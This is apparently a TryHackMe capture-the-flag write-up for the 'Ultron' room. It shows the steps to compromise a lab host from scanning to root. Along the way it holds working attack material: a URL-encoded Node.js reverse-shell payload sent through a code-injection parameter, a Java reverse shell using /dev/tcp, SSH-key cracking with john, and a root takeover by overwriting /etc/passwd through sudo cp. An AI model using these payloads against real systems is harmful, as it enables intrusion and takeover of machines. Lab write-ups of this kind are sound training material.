# Ultron CTF -TryHackMe
# Author [ RjRaju ]

# Open Ports
```
Open 10.10.80.166:7022 ( openSSH )
Open 10.10.80.166:7127 ( unknown )
Open 10.10.80.166:8800 ( http )
```

# Nmap Scan

```
# Nmap 7.80 scan initiated Fri Jun 24 14:52:19 2022 as: nmap -p7022,7127,8800 -sV -sC -A -oN nmap.log -vvvv -Pn 10.10.80.166
Nmap scan report for 10.10.80.166
Host is up, received user-set (0.18s latency).
Scanned at 2022-06-24 14:52:19 IST for 188s

PORT     STATE SERVICE REASON  VERSION
7022/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f0:c0:cd:b4:9a:8d:c9:8d:3e:59:0a:a6:f6:90:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1bXcB0fckEaiQ+Xi0qjkEMCAX7yIz9YQ4AJuvzWHP2PnKVXFt+Wckkx4rDiGV/GKzv0q+JxmrzB8vp9nfo3khGU0+vboTcR3QbdF6aGVcdCqwFew6pxfagDsmvdG3y+BYmuy1Va1wn8WlrPIbHfdnAkgjr2Su5NICGgl3Tsw5lsoZGMkEuhJAk9TLQaTZwhzwYbTiAfKkIsOheMX8EVXCYzp0yLeXt6vlE1zkO1vMz4DIOZFeXUc3Ui0KDelsLx6EnHgDO7qbHyHK1JDspWFezqNBtbvNXJtUuR6wp/nhk/fmgcp68+VS7zP+0Vj3jqXM460u37opO1H9xjHkSMCD
|   256 17:b2:38:4d:f0:d5:d3:4a:a9:15:96:88:aa:d8:25:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDjyampWAXdngZTH9Bx5iNZ9C4nJKOjmRTqntbKG+BpC8LJfnpGqr6lHzZ39Mh9XV7zgUDAPl9K7dTqIEWA9+cU=
|   256 38:99:59:33:67:ea:c6:e6:24:be:62:70:12:ec:3e:ac (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM9MySBQaVRLy7uOvFkb+bK1DmDcgpsZ1Tb5Xoh94JcV
7127/tcp open  unknown syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     Username : Password :
|   NULL: 
|_    Username :
8800/tcp open  http    syn-ack nginx 1.21.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.21.6
|_http-title: 502 Bad Gateway
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7127-TCP:V=7.80%I=7%D=6/24%Time=62B58252%P=x86_64-pc-linux-gnu%r(NU
SF:LL,B,"Username\x20:\x20")%r(GenericLines,16,"Username\x20:\x20Password\
SF:x20:\x20")%r(GetRequest,16,"Username\x20:\x20Password\x20:\x20")%r(HTTP
SF:Options,16,"Username\x20:\x20Password\x20:\x20")%r(RTSPRequest,16,"User
SF:name\x20:\x20Password\x20:\x20")%r(RPCCheck,16,"Username\x20:\x20Passwo
SF:rd\x20:\x20")%r(DNSVersionBindReqTCP,16,"Username\x20:\x20Password\x20:
SF:\x20")%r(DNSStatusRequestTCP,16,"Username\x20:\x20Password\x20:\x20")%r
SF:(Help,16,"Username\x20:\x20Password\x20:\x20")%r(SSLSessionReq,16,"User
SF:name\x20:\x20Password\x20:\x20")%r(TerminalServerCookie,16,"Username\x2
SF:0:\x20Password\x20:\x20")%r(TLSSessionReq,16,"Username\x20:\x20Password
SF:\x20:\x20")%r(Kerberos,16,"Username\x20:\x20Password\x20:\x20")%r(SMBPr
SF:ogNeg,16,"Username\x20:\x20Password\x20:\x20")%r(X11Probe,16,"Username\
SF:x20:\x20Password\x20:\x20")%r(FourOhFourRequest,16,"Username\x20:\x20Pa
SF:ssword\x20:\x20")%r(LPDString,16,"Username\x20:\x20Password\x20:\x20")%
SF:r(LDAPSearchReq,16,"Username\x20:\x20Password\x20:\x20")%r(LDAPBindReq,
SF:16,"Username\x20:\x20Password\x20:\x20")%r(SIPOptions,16,"Username\x20:
SF:\x20Password\x20:\x20")%r(LANDesk-RC,16,"Username\x20:\x20Password\x20:
SF:\x20")%r(TerminalServer,16,"Username\x20:\x20Password\x20:\x20")%r(NCP,
SF:16,"Username\x20:\x20Password\x20:\x20")%r(NotesRPC,16,"Username\x20:\x
SF:20Password\x20:\x20")%r(JavaRMI,16,"Username\x20:\x20Password\x20:\x20"
SF:)%r(WMSRequest,16,"Username\x20:\x20Password\x20:\x20")%r(oracle-tns,16
SF:,"Username\x20:\x20Password\x20:\x20")%r(ms-sql-s,16,"Username\x20:\x20
SF:Password\x20:\x20")%r(afp,16,"Username\x20:\x20Password\x20:\x20")%r(gi
SF:op,16,"Username\x20:\x20Password\x20:\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 24 14:55:27 2022 -- 1 IP address (1 host up) scanned in 188.18 seconds
```

# Gobusters Scan
```
$ gobuster -u http://10.10.80.166:8800 -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt | tee gobuster.log
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.80.166:8800/
[+] Threads      : 10
[+] Wordlist     : /opt/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/06/24 14:56:30 Starting gobuster
=====================================================
/Login (Status: 200)
/css (Status: 301)
/img (Status: 301)
/login (Status: 200)
/public (Status: 301)
/register (Status: 200)
/robots.txt (Status: 200)
/source (Status: 302)
/upload (Status: 301)
/views (Status: 301)
2022/06/24 15:04:00 Finished
=====================================================
=====================================================
```

# Port 8800
* Http server running on a port `8800`, regester a account and login , in dashboard there is a `upload` option we can upload any types of files.
* In `/upload` path we can see the uploaded files. but it is not `vulnerable` to file uplod vulnerability.

* In `/source` path there is a input field to enter text it is `vulnerable` to `code execution` vulnerability.

* In URL `http:$IP:8800/source?name=RjRaju` it will reflect same name
* now its time to create a javascript payload

```js
var net = require("net"),sh = require("child_process").exec("/bin/sh");var client = new net.Socket();client.connect(1234, "10.14.24.37", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
```
* use `URL encode` to encode our payload
```
var%20net%20%3D%20require(%22net%22)%2Csh%20%3D%20require(%22child_process%22).exec(%22%2Fbin%2Fsh%22)%3Bvar%20client%20%3D%20new%20net.Socket()%3B%0Aclient.connect(1234%2C%20%2210.14.24.37%22%2C%20function()%7B%09client.pipe(sh.stdin)%3B%09sh.stdout.pipe(client)%3B%09sh.stderr.pipe(client)%3B%7D)%3B
```
* Start Listening on port `1234` 
```
$ nc -lnvp 1234
Listening on 0.0.0.0 1234
```
* Final url
```
http://$IP:8800/source?name=var%20net%20%3D%20require(%22net%22)%2Csh%20%3D%20require(%22child_process%22).exec(%22%2Fbin%2Fsh%22)%3Bvar%20client%20%3D%20new%20net.Socket()%3B%0Aclient.connect(1234%2C%20%2210.14.24.37%22%2C%20function()%7B%09client.pipe(sh.stdin)%3B%09sh.stdout.pipe(client)%3B%09sh.stderr.pipe(client)%3B%7D)%3B
```

# Shell
```
$ nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.80.166 34314
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```

* We got the shell but its Docker contanier

# Stabilize the shell
```
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@d1ba8a2c0146:/app$ export TERM=xterm
export TERM=xterm
www-data@d1ba8a2c0146:/app$ ^Z
[1]  + 39249 suspended  nc -lnvp 1234
$ stty raw -echo;fg
[1]  + 39249 continued  nc -lnvp 1234

www-data@d1ba8a2c0146:/app$ 
www-data@d1ba8a2c0146:/app$ 
```

# Creds
* Found some creds in `config.json` file.
```
www-data@d1ba8a2c0146:/app$ ls
config.json   package-lock.json  passport-config.js  robots.txt  upload
node_modules  package.json	 public		     server.js	 views
www-data@d1ba8a2c0146:/app$ cat config.json 
{
 "name":"ultron",
 "author" : "RjRaju",
 "contact":"https://bit.ly/3yXmAlb",
 "login" : {
    "type" : "BackDoor",
    "port" : "7127",
    "username" : "ultron",
    "password" : "MzIxQHRzQGMwSgo="
   }
}
www-data@d1ba8a2c0146:/app$ echo "MzIxQHRzQGMwSgo=" | base64 -d
321@ts@c0J
www-data@d1ba8a2c0146:/app$ echo "MzIxQHRzQGMwSgo=" | base64 -d | rev
J0c@st@123
www-data@d1ba8a2c0146:/app$ 
```

# Port 7127 ( unknown )
* Port 7127 is a netcat login portal.
```
$ nc 10.10.80.166 7127 -vv
Connection to 10.10.80.166 7127 port [tcp/*] succeeded!
Username : ultron
Password : J0c@st@123

 wElc0m3 ! 

| ~ > id
uid=1005(pietro) gid=1005(pietro) groups=1005(pietro),1004(wandamaximoff)

| ~ > whoami
pietro

| ~ > 

```
* Login using SSH keys
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjqN3sKOk44gceePiScMt2puWnHrxFVDQvjGB9Evy5Rj4wnePTX6eaKAKE3OXeoPsV9WFUIRvQOiS77DJdYK/MiepTOW9LnucUhpOgquOrurcbv0v1EJGIuNRJCjtLPfgSbYdQh3vu3s0Q92b8xZGL74cUDRWl3mnRK4MQAD5Ae0dE545bTVeC/HJQPrI4TW1sZX1IZJVNhXHRAmNPPam2sH8tupQ561KXA0YFaJLB42e5zakE3qAJRHoli+ey2JftUaLIS65eHSvIvUX9vUEupfC9FMtb2G2lgsNuZXDzl77rhYgQht6PMpvBgtRhX/++XiE2yEVdBca6BkvlgUwoj30gQG6uzZy1LaIzRyRkFmIH2lBLpyynJYlkCGUFYu1poMKmdNVVyAW8dij9SY0qizBar97KhEXOqH+6hZfdyj0e2WWaLZlnPXdl/STU85Cpj4JvZTB/ArVOfVh9KKaqnmtZkcpFH2KY7SuSmfvl1qXNXy5/wvUjuCLEn+85qoc=" > .ssh/authorized_keys
```

```
$ssh pietro@10.10.80.166 -p 7022
The authenticity of host '[10.10.80.166]:7022 ([10.10.80.166]:7022)' can't be established.
ED25519 key fingerprint is SHA256:FgQ6wEUqblJo9m/4U+3EHlKZWa7dvz3nhUy6lnh27NA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.80.166]:7022' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-180-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jun 24 10:21:45 UTC 2022

  System load:  0.1               Users logged in:                0
  Usage of /:   6.9% of 61.80GB   IP address for eth0:            10.10.80.166
  Memory usage: 28%               IP address for docker0:         172.17.0.1
  Swap usage:   0%                IP address for br-fbcdad5f60eb: 172.18.0.1
  Processes:    108

  => There is 1 zombie process.


This system is built by the Bento project by Chef Software
More information can be found at https://github.com/chef/bento
pietro@ultron:~$ 
```
* We can't upload the `linpeas.sh` script to box because the `Firewall` blocking the connection.
* lets enumerate manualy.
* After some enumeration Found a SSH key to login
```
pietro@ultron:~$ cd /usr/
pietro@ultron:/usr$ ls
bin  games  include  lib  local  sbin  share  Sokovia  src
pietro@ultron:/usr$ cd Sokovia/
pietro@ultron:/usr/Sokovia$ ls
my_login_key
pietro@ultron:/usr/Sokovia$ cat my_login_key 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,757240282D23F6F9E9379F5604669E95

tuj2h4ZyeJzVrVVleyJzvn4/NvDNTcQci1cvGbtiVt9Zx6onCymsEwv1IcaP96rs
k4dv0vmbO/UMJMlFbJRUj4AC8lkYUB5K1rDWu+Q+JbQnJQ1x8/1N8Tjxs+T4Wjvn
ObWvO5J1cjoDcecDMOYaxKtF0RKau9ETefWTf6KrDUHewZijm1EZpYjsIR/7WMnr
dIWoayqWShAA2p/WpHslQO42b7HzVB3KWy/CY55Ll0L3dHEklvRQ7Bn/9OiBBQ7/
timGqUQJd4H6V0Ld+P4cYfcHQSiKIuU8lHI3UhZvB9JfX/NjGyAIQlOsb5jU4f+J
JQ3N0udZBwTp0RPsYmy7sHyvU9LgCRpelvwe8ONzJYZ0QFfA10x7L4DNpMbnEyCY
ENTl+YCbmF3zLW3ZLgQdk+3JXkjESsfgQvT0DQpO/AuUIg1VhbkiYbvCAf+tY7bw
e+uDECWDQsvMAl9EN7RdSXsMgideVQ8LEo9eoAVytABREWNu5DUHd5OfvYG21WUL
Q5mT7Ha9Cp7OwDhEj/QjR0/Cci6Opoz6KvQPgFXeu32taTNQiXlWpi8JieLNahe7
dIikhgLs+iQD1pt8/XhQTgD0YwwcFhlfu6qbx8dOn8J+DQk7Z5mCh1y6WQRdC9w9
q+BahPbX8jRIBoz0EWq0/fKJXybsC/JbvsMvljrDYHHXecAebXZJswfT7CuOC9kO
QTaoTE8GcIfdWQssjbhnvDOoZMpE1JF40NE1cWdzPHbcn3Rbu3w3Se3/bCEDxt97
GqipXxF4rSwfRaDW9lEH2bn6UQ30fy53vQdsIaX7m4EGJL/0hn4D9pg9LBiMEYHx
EKnT4DtPmxq2FhaBBFeUbU4z9GwBp8UyVHM3FVtZCos9Vyd9ec1Cip2vIRmIcL6/
MaeIdwA4W1/hyZFT4TLCBHDWZTzS4d1Ncjx4cFOjFmlGJtXzsR2DCAO0eu2ixvgN
GG9nktkVa/3dCIV+AfzBTGLDmE2oFzw0Ky2uzp16eIsKOeBOOHAZiP4UsfQkxfHZ
is2HSA0EG9SbvWOIk7MMcoSICWRL6xjsCxC2jn2Sm105cmCnAFQ0kJTh1IYJdwIq
AMtS6TlwAV7agmySn3esrS56ktN1LJStXIHpVMqFZ9rCDQBtrZ4pNkB50jMASWuG
JFkNqvxF+ogQTxg4KthrC++9yZsWkJfuVls4Ob7Rvq/op07IG41tfdAX0xoZ2kTh
w2d5i6dZPId5v2j7gmsz+gK3y3IVHq0M9CY3MR1YAhXG261z6tlAN5xSFXibhTfF
Icu+Obr3Rr0Rc1hWE0sUAtLJSvlB3PMEFb2mPlFlBF/efu2v/0al/w0V/WqKrpap
anonoZ4A53fmh4nuhXjZ8AxZHMxwY79hRJTAZEII+4AATBlArEvUQdYl5I+RIAo7
nkIHpiPOrFXwJVmxYZ8ebrI75EErATb98iYztxFHNXfEqan+qmgsSVQpCZYi2Xz3
f75Lpt2iCgBJ9E012dpFjPdTe/UHs/D2M6VcV5yIqjqqIsvqEJajXUd1eytXjTLB
5m5e2PMhMIL9PXUuPu2clUNgkhoc+gH2KU+xZcDY8+SOWZzK56CowP7gWqB8ED92
-----END RSA PRIVATE KEY-----
pietro@ultron:/usr/Sokovia$
```

* SSH Key is encrypted, lets decrypt.
```
$ ssh2john id_rsa > hash

$ john hash --wordlist=/opt/rockyou.txt
Using default input encoding: UTF-8
Loading 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=md5/AEC 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 1 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xavier           (id_rsa)
1g 0:00:00:00 Done (2022-05-27 17:21) 1.234g/s 632.0p/s 632.0c/s 632.0p/s teiubesc..letmein
Session completed.
```
* Now login to `wandamaximoff` account using id_rsa key

```
$ nano id_rsa
$ chmod 600 id_rsa 
$ ssh -i id_rsa wandamaximoff@10.10.80.166 -p 7022
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-180-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jun 24 10:44:55 UTC 2022

  System load:  0.08              Users logged in:                1
  Usage of /:   6.9% of 61.80GB   IP address for eth0:            10.10.80.166
  Memory usage: 32%               IP address for docker0:         172.17.0.1
  Swap usage:   0%                IP address for br-fbcdad5f60eb: 172.18.0.1
  Processes:    113

  => There is 1 zombie process.


This system is built by the Bento project by Chef Software
More information can be found at https://github.com/chef/bento
wandamaximoff@ultron:~$ 
```

* Lets do some manual enumeration
```
wandamaximoff@ultron:~$ id
uid=1004(wandamaximoff) gid=1004(wandamaximoff) groups=1004(wandamaximoff),1005(pietro)
wandamaximoff@ultron:~$ sudo -l
Matching Defaults entries for wandamaximoff on ultron:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wandamaximoff may run the following commands on ultron:
    (vision) NOPASSWD: /usr/bin/java
wandamaximoff@ultron:~$ 
```

* By using `java` we can do `horizontal privilege escalation`
* Create a java payload or use `https://www.revshells.com/` website for reverse shells
```java
public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/127.0.0.1/1234 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```
## Note :
**The Java payload didn't give us reverse shell on Attacker-machine because the Firewall is blocking the connection.**

* we loged in as `pietro` uses, now use `netcat` to listen on port 1234 in box.
* Another hand `wandamaximoff` user we will run our `java payload`, after we will get the reverse shell on `pietro`.

```
wandamaximoff@ultron:/dev/shm$ nano Shell.java
wandamaximoff@ultron:/dev/shm$ sudo -l
Matching Defaults entries for wandamaximoff on ultron:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wandamaximoff may run the following commands on ultron:
    (vision) NOPASSWD: /usr/bin/java
wandamaximoff@ultron:/dev/shm$ 
wandamaximoff@ultron:/dev/shm$ sudo -u vision /usr/bin/java Shell.java 
```

* We got the reverse shell as `vision` user. 
```
pietro@ultron:~$ nc -lnvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 127.0.0.1 47962 received!
vision@ultron:/dev/shm$ 
```

* Stabilize the shell
```
vision@ultron:/dev/shm$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
vision@ultron:/dev/shm$ export TERM=xterm
export TERM=xterm
vision@ultron:/dev/shm$ ^Z
[1]+  Stopped                 nc -lnvp 1234
pietro@ultron:~$ stty raw -echo;fg
nc -lnvp 1234

vision@ultron:/dev/shm$ 
vision@ultron:/dev/shm$ 
```
* Found `user flag`
```
vision@ultron:~$ cd /home/
vision@ultron:/home$ cd vision/
vision@ultron:/home/vision$ ls -lah
total 24K
drwxr-xr-x 2 vision vision 4.0K May 26 14:59 .
drwxr-xr-x 6 root   root   4.0K May 26 14:55 ..
lrwxrwxrwx 1 vision vision    9 May 26 14:56 .bash_history -> /dev/null
-rw-r--r-- 1 vision vision  220 May 26 12:01 .bash_logout
-rw-r--r-- 1 vision vision 3.7K May 26 12:01 .bashrc
-rw-r--r-- 1 vision vision  807 May 26 12:01 .profile
-r-------- 1 vision vision   39 May 26 14:59 user.txt
vision@ultron:/home/vision$ cat user.txt 
FLAG{c60498db8864c761673d8d7814ce6dd9}
vision@ultron:/home/vision$ 
```

# privilege escalation
```
vision@ultron:/home/vision$ sudo -l
Matching Defaults entries for vision on ultron:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vision may run the following commands on ultron:
    (root) NOPASSWD: /bin/cp
```

* we have `cp` binary to use as `root`.
* Now overright the `/etc/passwd`

```
vision@ultron:/home/vision$ cd /dev/shm
vision@ultron:/dev/shm$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
statd:x:110:65534::/var/lib/nfs:/usr/sbin/nologin
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
server:x:1002:1002:,,,:/home/server:/bin/bash
vision:x:1003:1003:,,,:/home/vision:/bin/bash
wandamaximoff:x:1004:1004:,,,:/home/wandamaximoff:/bin/bash
pietro:x:1005:1005:,,,:/home/pietro:/bin/bash
```
* Take backup `/etc/passwd` in /dev/shm path as `passwd`
* Use Openssl to create a password hash
```
$ openssl passwd -1 -salt secured root
$1$secured$KAH9grY17zF3fCAo.Zch31
```
* Create a user account and add to backup passwd file
```
hack:$1$secured$KAH9grY17zF3fCAo.Zch31:0:0:root:/root:/bin/bash
```
```
vision@ultron:/dev/shm$ sudo -l
Matching Defaults entries for vision on ultron:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vision may run the following commands on ultron:
    (root) NOPASSWD: /bin/cp
vision@ultron:/dev/shm$ sudo -u root /bin/cp passwd /etc/passwd
vision@ultron:/dev/shm$ su hack
Password: 
root@ultron:/dev/shm# cd /root
root@ultron:~# ls
root.txt
root@ultron:~# cat root.txt
root.txt
root@ultron:~# 
root@ultron:~# 
```
* We can't read the data on `root.txt` file because the `.bashrc` file have `alias cat='echo'` remove the alias , or use vim,nano,tac other commands to get root flag.
```
root@ultron:~# tac root.txt 
fTUyMzU3OWZiNDZkY2Y2ZmRmNzZmMTViNDQxZDE4ZDBme0dBTEYK
root@ultron:~# tac root.txt | base64 -d
}523579fb46dcf6fdf76f15b441d18d0f{GALF
root@ultron:~# tac root.txt | base64 -d | rev
FLAG{f0d81d144b51f67fdf6fcd64bf975325}
root@ultron:~# 
```

# Completed :)
# Happy Hacking...
